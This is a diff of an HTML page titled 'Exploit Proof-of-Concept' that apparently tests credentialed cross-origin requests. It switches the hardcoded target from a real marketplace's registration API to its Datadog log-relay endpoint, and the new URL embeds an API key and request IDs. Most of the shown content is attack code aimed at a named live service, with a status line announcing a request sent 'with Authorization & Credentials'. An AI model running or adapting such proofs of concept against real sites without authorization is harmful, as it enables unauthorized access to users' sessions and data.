@@ -17,7 +17,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>https://www.whatnot.com/services/api/v2/register</code></p>
+    <p>Target: <code>https://www.whatnot.com/reroute/datadog/api/v2/logs?ddsource=browser&dd-api-key=pub7a8b2c96a28b9d6bd00a67d39ce24b4c&dd-evp-origin-version=6.23.0&dd-evp-origin=browser&dd-request-id=2e7119c3-e74a-4d5f-8042-0208c926d0af</code></p>
     <p>Source Origin: <code>https://stelemane.github.io</code></p>
     
     <div id="status" class="status">[*] Initializing Request...</div>
@@ -29,7 +29,7 @@
         const statusDiv = document.getElementById('status');
         const outputDiv = document.getElementById('output');
         
-        const target = "https://www.whatnot.com/services/api/v2/register";
+        const target = "https://www.whatnot.com/reroute/datadog/api/v2/logs?ddsource=browser&dd-api-key=pub7a8b2c96a28b9d6bd00a67d39ce24b4c&dd-evp-origin-version=6.23.0&dd-evp-origin=browser&dd-request-id=2e7119c3-e74a-4d5f-8042-0208c926d0af";
 
         statusDiv.innerText = "[*] Sending request with Authorization & Credentials (No Fingerprint)...";
 
